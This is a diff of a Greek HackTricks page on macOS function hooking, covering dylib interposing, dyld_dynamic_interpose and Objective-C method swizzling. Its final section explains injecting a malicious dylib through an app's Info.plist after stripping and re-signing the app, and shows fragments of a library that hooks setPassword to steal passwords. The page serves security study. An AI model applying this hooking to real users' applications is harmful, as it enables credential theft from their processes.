@@ -1,30 +1,30 @@
-# macOS Function Hooking
+# macOS Συνάρτηση Hooking
 
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## Ενδιάμεση Συνάρτηση
+## Ενδιάμεση Εισαγωγή
 
-Δημιουργήστε ένα **dylib** με μια ενότητα **`__interpose`** (ή μια ενότητα με σημαία **`S_INTERPOSING`**) που περιέχει tuples από **δείκτες συναρτήσεων** που αναφέρονται στις **αρχικές** και **αντικατάστασης** συναρτήσεις.
+Δημιουργήστε ένα **dylib** με μια ενότητα **`__interpose` (`__DATA___interpose`)** (ή μια ενότητα με σημαία **`S_INTERPOSING`**) που περιέχει ζεύγη **δεικτών συναρτήσεων** που αναφέρονται στις **αρχικές** και τις **αντικατάστασης** συναρτήσεις.
 
-Στη συνέχεια, **εισαγάγετε** το dylib με τη χρήση του **`DYLD_INSERT_LIBRARIES`** (η ενδιάμεση συνάρτηση πρέπει να γίνει πριν φορτωθεί η κύρια εφαρμογή). Φυσικά, οι [**περιορισμοί** που ισχύουν για τη χρήση του **`DYLD_INSERT_LIBRARIES`** ισχύουν και εδώ](macos-library-injection/#check-restrictions).
+Στη συνέχεια, **ενσωματώστε** το dylib με το **`DYLD_INSERT_LIBRARIES`** (η ενδιάμεση εισαγωγή πρέπει να γίνει πριν το κύριο app φορτώσει). Φυσικά, οι [**περιορισμοί** που εφαρμόζονται στη χρήση του **`DYLD_INSERT_LIBRARIES`** ισχύουν και εδώ](macos-library-injection/#check-restrictions).
 
-### Ενδιάμεση συνάρτηση printf
+### Ενδιάμεση εισαγωγή printf
 
 {% tabs %}
 {% tab title="interpose.c" %}
-{% code title="interpose.c" %}
+{% code title="interpose.c" overflow="wrap" %}
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 #include <stdio.h>
@@ -56,32 +56,10 @@ printf("Hello World!\n");
 return 0;
 }
 ```
+{% endtab %}
 
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <dlfcn.h>
-
-typedef int (*orig_open_type)(const char *pathname, int flags);
-typedef FILE *(*orig_fopen_type)(const char *pathname, const char *mode);
-
-int open(const char *pathname, int flags) {
-    orig_open_type orig_open;
-    orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
-    printf("Opening file: %s\n", pathname);
-    return orig_open(pathname, flags);
-}
-
-FILE *fopen(const char *pathname, const char *mode) {
-    orig_fopen_type orig_fopen;
-    orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
-    printf("Opening file: %s\n", pathname);
-    return orig_fopen(pathname, mode);
-}
-```
-
-Αυτός ο κώδικας χρησιμοποιεί την τεχνική του function hooking για να παρακολουθήσει τις κλήσεις των συναρτήσεων `open` και `fopen` σε ένα πρόγραμμα στο macOS. Ο κώδικας αυτός χρησιμοποιεί τη βιβλιοθήκη `dlfcn.h` για να φορτώσει δυναμικά τις συναρτήσεις `open` και `fopen` και να αντικαταστήσει τις πρωτότυπες υλοποιήσεις τους με τις δικές του. Όταν καλείται η συνάρτηση `open` ή `fopen`, ο κώδικας αυτός εκτυπώνει το όνομα του αρχείου που ανοίγεται και στη συνέχεια καλεί την πρωτότυπη υλοποίηση της συνάρτησης για να εκτελέσει την πραγματική λειτουργία της.
-
+{% tab title="interpose2.c" %}
+{% code overflow="wrap" %}
 ```c
 // Just another way to define an interpose
 // gcc -dynamiclib interpose2.c -o interpose2.dylib
@@ -105,9 +83,9 @@ return ret;
 
 DYLD_INTERPOSE(my_printf,printf);
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
 Hello from interpose
@@ -115,25 +93,44 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
+{% hint style="warning" %}
+Η μεταβλητή περιβάλλοντος **`DYLD_PRINT_INTERPOSTING`** μπορεί να χρησιμοποιηθεί για να ελέγξετε το interposing και θα εκτυπώσει τη διαδικασία interpose.
+{% endhint %}
 
+Επίσης, σημειώστε ότι **το interposing συμβαίνει μεταξύ της διεργασίας και των φορτωμένων βιβλιοθηκών**, δεν λειτουργεί με την κοινόχρηστη μνήμη βιβλιοθηκών.
+
+### Δυναμικό Interposing
+
+Τώρα είναι επίσης δυνατό να γίνει interpose μια συνάρτηση δυναμικά χρησιμοποιώντας τη συνάρτηση **`dyld_dynamic_interpose`**. Αυτό επιτρέπει το προγραμματιστικό interposing μιας συνάρτησης κατά τη διάρκεια της εκτέλεσης αντί να γίνεται μόνο από την αρχή.
+
+Απλώς χρειάζεται να υποδείξετε τα **ζεύγη** της **συνάρτησης που θα αντικατασταθεί και της αντικατάστασης** συνάρτησης.
+```c
+struct dyld_interpose_tuple {
+const void* replacement;
+const void* replacee;
+};
+extern void dyld_dynamic_interpose(const struct mach_header* mh,
+const struct dyld_interpose_tuple array[], size_t count);
+```
 ## Αντικατάσταση Μεθόδων
 
-Στην ObjectiveC έτσι καλείται μια μέθοδος: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
+Στο ObjectiveC έτσι καλείται μια μέθοδος: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
-Χρειάζεται το **αντικείμενο**, η **μέθοδος** και τα **παράμετρα**. Και όταν καλείται μια μέθοδος, στέλνεται ένα **μήνυμα** χρησιμοποιώντας τη συνάρτηση **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
+Χρειάζεται το **αντικείμενο**, η **μέθοδος** και τα **ορίσματα**. Και όταν καλείται μια μέθοδος, ένα **μήνυμα στέλνεται** χρησιμοποιώντας τη συνάρτηση **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
-Το αντικείμενο είναι το **`someObject`**, η μέθοδος είναι **`@selector(method1p1:p2:)`** και τα ορίσματα είναι τα **value1**, **value2**.
+Το αντικείμενο είναι το **`someObject`**, η μέθοδος είναι **`@selector(method1p1:p2:)`** και τα ορίσματα είναι **value1**, **value2**.
 
-Ακολουθώντας τις δομές των αντικειμένων, είναι δυνατή η πρόσβαση σε ένα **πίνακα μεθόδων** όπου οι **ονομασίες** και οι **δείκτες** του κώδικα της μεθόδου βρίσκονται.
+Ακολουθώντας τις δομές των αντικειμένων, είναι δυνατό να φτάσετε σε ένα **πίνακα μεθόδων** όπου οι **ονομασίες** και οι **δείκτες** προς τον κώδικα της μεθόδου **βρίσκονται**.
 
 {% hint style="danger" %}
-Σημειώστε ότι επειδή οι μέθοδοι και οι κλάσεις προσπελαύνονται με βάση τα ονόματά τους, αυτές οι πληροφορίες αποθηκεύονται στο δυαδικό αρχείο, οπότε είναι δυνατή η ανάκτησή τους με τη χρήση της εντολής `otool -ov </path/bin>` ή [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
+Σημειώστε ότι επειδή οι μέθοδοι και οι κλάσεις προσπελαύνονται με βάση τα ονόματά τους, αυτές οι πληροφορίες αποθηκεύονται στο δυαδικό αρχείο, οπότε είναι δυνατό να τις ανακτήσετε με την εντολή `otool -ov </path/bin>` ή [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
 {% endhint %}
 
 ### Πρόσβαση στις ακατέργαστες μεθόδους
 
-Είναι δυνατό να αποκτηθούν πληροφορίες για τις μέθοδους, όπως το όνομα, ο αριθμός των παραμέτρων ή η διεύθυνση, όπως φαίνεται στο παρακάτω παράδειγμα:
+Είναι δυνατό να έχετε πρόσβαση στις πληροφορίες των μεθόδων όπως το όνομα, ο αριθμός των ορισμάτων ή η διεύθυνση όπως στο παρακάτω παράδειγμα:
 
+{% code overflow="wrap" %}
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -199,15 +196,17 @@ NSLog(@"Uppercase string: %@", uppercaseString3);
 return 0;
 }
 ```
+{% endcode %}
 
-### Αντικατάσταση μεθόδου με την method\_exchangeImplementations
+### Αντικατάσταση Μεθόδου με τη μέθοδο method\_exchangeImplementations
 
-Η συνάρτηση **`method_exchangeImplementations`** επιτρέπει την **αλλαγή** της **διεύθυνσης** της **υλοποίησης** μιας συνάρτησης με την άλλη.
+Η συνάρτηση **`method_exchangeImplementations`** επιτρέπει τη **αλλαγή** της **διεύθυνσης** της **υλοποίησης** μιας **συνάρτησης με μια άλλη**.
 
 {% hint style="danger" %}
-Έτσι, όταν καλείται μια συνάρτηση, εκτελείται η άλλη.
+Έτσι, όταν καλείται μια συνάρτηση, **εκτελείται η άλλη**.
 {% endhint %}
 
+{% code overflow="wrap" %}
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -251,19 +250,21 @@ NSLog(@"Substring: %@", subString);
 return 0;
 }
 ```
+{% endcode %}
 
 {% hint style="warning" %}
-Σε αυτήν την περίπτωση, αν ο κώδικας υλοποίησης της νόμιμης μεθόδου επαληθεύει το όνομα της μεθόδου, μπορεί να ανιχνεύσει αυτήν την αντικατάσταση και να την εμποδίσει από την εκτέλεσή της.
+Σε αυτήν την περίπτωση, αν ο κώδικας υλοποίησης της νόμιμης μεθόδου επαληθεύει το όνομα της μεθόδου, θα μπορούσε να ανιχνεύσει αυτήν την αντικατάσταση και να την εμποδίσει από το να εκτελεστεί.
 
-Η παρακάτω τεχνική δεν έχει αυτόν τον περιορισμό.
+Η ακόλουθη τεχνική δεν έχει αυτόν τον περιορισμό.
 {% endhint %}
 
-### Αντικατάσταση Μεθόδου με την method\_setImplementation
+### Αντικατάσταση Μεθόδου με τη μέθοδο method\_setImplementation
 
-Η προηγούμενη μορφή είναι περίεργη επειδή αλλάζετε την υλοποίηση 2 μεθόδων μεταξύ τους. Χρησιμοποιώντας τη συνάρτηση **`method_setImplementation`** μπορείτε να αλλάξετε την υλοποίηση μιας μεθόδου με την υλοποίηση μιας άλλης.
+Η προηγούμενη μορφή είναι περίεργη επειδή αλλάζετε την υλοποίηση 2 μεθόδων μεταξύ τους. Χρησιμοποιώντας τη συνάρτηση **`method_setImplementation`** μπορείτε να αλλάξετε την υλοποίηση μιας μεθόδου με μια άλλη.
 
-Απλά θυμηθείτε να **αποθηκεύσετε τη διεύθυνση της υλοποίησης της αρχικής μεθόδου** αν πρόκειται να την καλέσετε από τη νέα υλοποίηση πριν την αντικαταστήσετε, διότι αργότερα θα είναι πολύ πιο δύσκολο να εντοπίσετε αυτήν τη διεύθυνση.
+Απλά θυμηθείτε να **αποθηκεύσετε τη διεύθυνση της υλοποίησης της αρχικής** αν πρόκειται να την καλέσετε από τη νέα υλοποίηση πριν την αντικαταστήσετε, διότι αργότερα θα είναι πολύ πιο περίπλοκο να εντοπίσετε αυτήν τη διεύθυνση.
 
+{% code overflow="wrap" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -315,19 +316,19 @@ return 0;
 }
 }
 ```
+{% endcode %}
 
 ## Μεθοδολογία Επίθεσης Hooking
 
-Σε αυτήν τη σελίδα συζητήθηκαν διάφοροι τρόποι για το hooking συναρτήσεων. Ωστόσο, αυτοί περιλάμβαναν **την εκτέλεση κώδικα μέσα στη διεργασία για επίθεση**.
+Σε αυτήν τη σελίδα συζητήθηκαν διαφορετικοί τρόποι για το hooking συναρτήσεων. Ωστόσο, αυτοί περιλάμβαναν **την εκτέλεση κώδικα μέσα στη διαδικασία για επίθεση**.
 
-Για να το κάνουμε αυτό, η πιο εύκολη τεχνική που μπορούμε να χρησιμοποιήσουμε είναι να εισάγουμε ένα [Dyld μέσω μεταβλητών περιβάλλοντος ή hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Ωστόσο, υποθέτω ότι αυτό μπορεί να γίνει επίσης μέσω [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
+Για να το κάνετε αυτό, η πιο εύκολη τεχνική που μπορείτε να χρησιμοποιήσετε είναι να ενθετώσετε ένα [Dyld μέσω μεταβλητών περιβάλλοντος ή hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Ωστόσο, υποθέτω ότι αυτό θα μπορούσε επίσης να γίνει μέσω [ενθετών διεργασιών Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).
 
-Ωστόσο, και οι δύο επιλογές είναι **περιορισμένες** σε **μη προστατευμένα** δυαδικά αρχεία/διεργασίες. Ελέγξτε κάθε τεχνική για να μάθετε περισσότερα για τους περιορισμούς.
+Ωστόσο, και οι δύο επιλογές είναι **περιορισμένες** σε **μη προστατευμένα** δυαδικά/διεργασίες. Ελέγξτε κάθε τεχνική για να μάθετε περισσότερα σχετικά με τους περιορισμούς.
 
-Ωστόσο, μια επίθεση με hooking συναρτήσεων είναι πολύ συγκεκριμένη, ένας επιτιθέμενος θα το κάνει αυτό για να **κλέψει ευαίσθητες πληροφορίες από μια διεργασία** (αν δεν ήταν έτσι, θα κάνατε απλά μια επίθεση με εισαγωγή διεργασίας). Και αυτές οι ευαίσθητες πληροφορίες μπορεί να βρίσκονται σε εφαρμογές που έχει κατεβάσει ο χρήστης, όπως το MacPass.
+Ωστόσο, μια επίθεση με hooking συναρτήσεων είναι πολύ συγκεκριμένη, ένας επιτιθέμενος θα το κάνει αυτό για να **κλέψει ευαίσθητες πληροφορίες από μέσα σε μια διαδικασία** (αν δεν ήθελε απλά να κάνει μια επίθεση ενθετών διεργασιών). Και αυτές οι ευαίσθητες πληροφορίες μπορεί να βρίσκονται σε εφαρμογές που έχει κατεβάσει ο χρήστης, όπως το MacPass.
 
-Έτσι, ο διανοούμενος θα πρέπει είτε να βρει μια ευπάθεια είτε να αφαιρέσει την υπογραφή της εφαρμογής, να εισάγει τη μεταβλητή περιβάλλοντος **`DYLD_INSERT_LIBRARIES`** μέσω του Info.plist της εφαρμογής, προσθέτοντας κάτι όπως:
-
+Έτσι, το διάνυσμα του επιτιθέμενου θα ήταν είτε να βρει μια ευπάθεια είτε να αφαιρέσει την υπογραφή της εφαρμογής, να ενθωρυνθεί η μεταβλητή περιβάλλοντος **`DYLD_INSERT_LIBRARIES`** μέσω του Info.plist της εφαρμογής προσθέτοντας κάτι σαν:
 ```xml
 <key>LSEnvironment</key>
 <dict>
@@ -335,7 +336,6 @@ return 0;
 <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-
 και στη συνέχεια **επανεγγράψτε** την εφαρμογή:
 
 {% code overflow="wrap" %}
@@ -347,11 +347,12 @@ return 0;
 Προσθέστε σε αυτή τη βιβλιοθήκη τον κώδικα hooking για να εξαγάγετε τις πληροφορίες: Κωδικοί πρόσβασης, μηνύματα...
 
 {% hint style="danger" %}
-Σημειώστε ότι σε νεότερες εκδόσεις του macOS, αν **αφαιρέσετε την υπογραφή** του δυαδικού αρχείου της εφαρμογής και αυτή έχει ήδη εκτελεστεί, το macOS **δεν θα εκτελέσει πλέον την εφαρμογή**.
+Σημειώστε ότι σε νεότερες εκδόσεις του macOS, αν **αφαιρέσετε την υπογραφή** του δυαδικού αρχείου της εφαρμογής και αυτή εκτελέστηκε προηγουμένως, το macOS **δεν θα εκτελέσει πλέον την εφαρμογή**.
 {% endhint %}
 
 #### Παράδειγμα βιβλιοθήκης
 
+{% code overflow="wrap" %}
 ```objectivec
 // gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
 
@@ -387,6 +388,7 @@ IMP fake_IMP = (IMP)custom_setPassword;
 real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
+{% endcode %}
 
 ## Αναφορές
 
@@ -394,14 +396,14 @@ real_setPassword = method_setImplementation(real_Method, fake_IMP);
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφημα**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
